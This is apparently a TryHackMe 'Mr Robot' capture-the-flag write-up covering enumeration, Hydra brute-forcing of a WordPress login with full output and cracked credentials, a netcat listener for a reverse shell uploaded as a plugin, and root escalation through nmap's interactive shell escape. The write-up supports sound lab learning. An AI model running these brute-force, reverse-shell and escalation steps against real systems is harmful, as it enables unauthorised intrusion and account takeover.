# MrRobot
> Based on the Mr. Robot show, can you root this box?

This Mr Robot [TryHackMe Room](https://tryhackme.com/room/mrrobot) has three hidden keys that
need to be found.

## Initial Enumeration
* nmap 
* gobuster

## Key 1
* Navigated to robots.txt:
```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

fsocity.dic contains a bunch of possible usernames and passwords. Perhaps we can
use this to brute force the WordPress login page?

I noticed there was a ton of duplicate text in the file, so I removed them with the
following bash command:

```
sort fsocity.dic | uniq > uniq.dic
```

This greatly reduced the number of lines in the file:

```
wc -l fsocity.dic uniq.dic                                                                                             
  858160 fsocity.dic                            
  11451 uniq.dic                          
 869611 total
```

## Brute Force User Credentials

Navigate to the WordPress login page found in the Gobuster scan

**TODO: add image**

Try to login:


**TODO: add image of test:test login**

View the request (I like to user the Developer Tools instead of BurpSuite, but use
whatever you're comfortable with)


**TODO: add image of request**


Copy the request payload and use it to brute force the correct username with Hydra:

```
$ hydra -L uniq.dic -p test 10.10.105.33 http-post-form "/wp-login.php/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.105.33%2Fwp-admin%2F&testcookie=1:F=Invalid username"
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-31 19:06:48
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:11452/p:1), ~716 tries per task
[DATA] attacking http-post-form://10.10.105.33:80/wp-login.php/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.105.33%2Fwp-admin%2F&testcookie=1:F=Invalid username
[STATUS] 189.00 tries/min, 189 tries in 00:01h, 11263 to do in 00:60h, 16 active
[STATUS] 189.00 tries/min, 567 tries in 00:03h, 10885 to do in 00:58h, 16 active
[STATUS] 258.14 tries/min, 1807 tries in 00:07h, 9645 to do in 00:38h, 16 active
[STATUS] 235.87 tries/min, 3538 tries in 00:15h, 7914 to do in 00:34h, 16 active

[80][http-post-form] host: 10.10.105.33   login: Elliot   password: test
```

username is **Elliot**

Now brute force the password:

```
hydra -l Elliot -P uniq.dic 10.10.230.119 http-post-form "/wp-login.php/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.105.33%2Fwp-admin%2F&testcookie=1:S=302"

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-02-01 14:26:18
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:1/p:11452), ~716 tries per task
[DATA] attacking http-post-form://10.10.230.119:80/wp-login.php/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.105.33%2Fwp-admin%2F&testcookie=1:S=302
[STATUS] 698.00 tries/min, 698 tries in 00:01h, 10754 to do in 00:16h, 16 active
[STATUS] 467.33 tries/min, 1402 tries in 00:03h, 10050 to do in 00:22h, 16 active
[STATUS] 366.57 tries/min, 2566 tries in 00:07h, 8886 to do in 00:25h, 16 active
[STATUS] 300.08 tries/min, 3601 tries in 00:12h, 7851 to do in 00:27h, 16 active
[STATUS] 246.59 tries/min, 5425 tries in 00:22h, 6027 to do in 00:25h, 16 active
[80][http-post-form] host: 10.10.230.119   login: Elliot   password: ER28-0652
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-02-01 14:49:41
```

password is **ER28-0652**

## Getting a Reverse Shell

First, start a netcat listener on the local attacker machine:

```
$ nc -nlvp 4444
```  

Next, prepare a PHP reverse shell to be uploaded as a WordPress plugin. The file must include the following comments to be recognized as a valid
WordPress plugin:

```

```

Finally, upload and activate the payload plugin to spawn a reverse shell.

**TODO: add image**

The second key can be found in the robot user's home directory.

## Privilege Escalation

```
robot@linux:/$ nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help

nmap> ! id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
waiting to reap child : No child processes
```

We are running with effective user id (euid) of root! This means we can print the last key found in
/root:

```
nmap> ! cat /root/key-3-of-3.txt
XXXXX
```
